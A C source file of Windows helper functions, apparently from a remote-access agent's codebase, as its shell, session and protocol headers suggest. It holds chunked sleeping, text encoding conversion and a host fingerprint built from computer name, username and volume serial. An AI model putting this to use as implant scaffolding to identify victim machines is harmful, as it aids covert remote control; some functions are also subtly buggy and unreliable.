#include <Windows.h>
#include <WinBase.h>
#include <stdint.h>
#include <stdio.h>
#include <processenv.h>
#include <namedpipeapi.h>
#include <fileapi.h>
#include <Psapi.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <LM.h>
#include <sysinfoapi.h>
#include <stringapiset.h>
#include <wabdefs.h>
#include "cJSON.h"
#include "agent_shell.h"
#include "agent_session.h"
#include "agent_utility.h"
#include "agent_protocol.h"
#include "agent_config.h"

#define SLEEP_TIME 400

void sleep_ms(uint32_t milliseconds) 
{	
	uint32_t i = 0;
	uint32_t remain = milliseconds % SLEEP_TIME;
	for (i = 0; i < milliseconds / SLEEP_TIME; i++) {
		WaitForSingleObject(GetCurrentThread(), SLEEP_TIME);
	}
	WaitForSingleObject(GetCurrentThread(), remain);
}

char* unicode_to_ascii(wchar_t *unicode_string)
{
	char *ascii_string = ZERO(char);
	uint32_t size = WideCharToMultiByte(CP_UTF8, 0, unicode_string, -1, NULL, 0, NULL, NULL);
	ascii_string = MEM_ALLOC(size);
	if (!ascii_string) goto fail;
	WideCharToMultiByte(CP_UTF8, 0, unicode_string, -1, ascii_string, size, NULL, NULL);
	return ascii_string;
fail:
	return ZERO(char);
}

char* normalize_text(uint8_t* buffer, uint32_t buffer_size) 
{
	char* result = ZERO(char);
	wchar_t* unicode_string = ZERO(wchar_t);

	if (!IsTextUnicode(buffer, buffer_size, NULL)) {
		// convert to unicode
		uint32_t code_page = GetOEMCP();
		int32_t size = MultiByteToWideChar(code_page, 0, buffer, -1, NULL, 0);
		if (size <= 0) goto fail;
		unicode_string = MEM_ALLOC((size + 1) * sizeof(wchar_t));
		if (!unicode_string) goto fail;
		if (MultiByteToWideChar(code_page, 0, buffer, -1, unicode_string, size) <= 0) goto fail;

		// convert back to UTF8 ascii string
		result = unicode_to_ascii(unicode_string);
		if (!result) goto fail;
	}
exit:
	FREE(unicode_string);
	return result;

fail:
	FREE(result);
	goto exit;

}

uint32_t system_fingerprint(void) {
	char* computer_name = ZERO(char);
	char* username = ZERO(char);
	char* win_dir = ZERO(char);
	char* fingerprint = ZERO(char);
	uint32_t system_fingerprint = 0;

	// get computer name
	uint32_t size = MAX_COMPUTERNAME_LENGTH + 1;
	computer_name = MEM_ALLOC(size);
	if (!computer_name) goto finish;
	if (!GetComputerName(computer_name, &size)) goto finish;

	// get user name
	size = UNLEN + 1;
	username = MEM_ALLOC(size);
	if (!username) goto finish;
	if (!GetUserName(username, &size)) goto finish;

	// disk serial
	size = MAX_PATH;
	uint32_t volumet_serial = 0;
	win_dir = MEM_ALLOC(size);
	if (!win_dir) goto finish;
	if (!GetSystemDirectory(win_dir, size)) goto finish;

	char drive[MAX_PATH + 1] = { 0 };
	_splitpath(win_dir, drive, 0, 0, 0);
	strcat(drive, "\\");
	if (!GetVolumeInformation(drive, 0, 0, &volumet_serial, 0, 0, 0, 0)) goto finish;

	size = snprintf(fingerprint, 0, "%s_%s_%x", computer_name, username, volumet_serial);
	fingerprint = MEM_ALLOC(size);
	if (!fingerprint) goto finish;
	snprintf(fingerprint, size, "%s_%s_%x", computer_name, username, volumet_serial);

	system_fingerprint = custom_FNV1a32(size, (uint8_t*)fingerprint);	

finish:
	FREE(computer_name);
	FREE(username);
	FREE(win_dir);
	FREE(fingerprint);
	return system_fingerprint;
}

int32_t get_OS_error() {
	return GetLastError();
}

void set_OS_error(uint32_t error_code) {
	SetLastError((DWORD)error_code);
}

bool expand_environment_variables(char* orig_path, char* expanded_path, size_t expanded_path_size) {
	bool result = false;
	if (!ExpandEnvironmentStrings(orig_path, expanded_path, expanded_path_size)) goto exit;
	result = true;

exit:
	return result;
}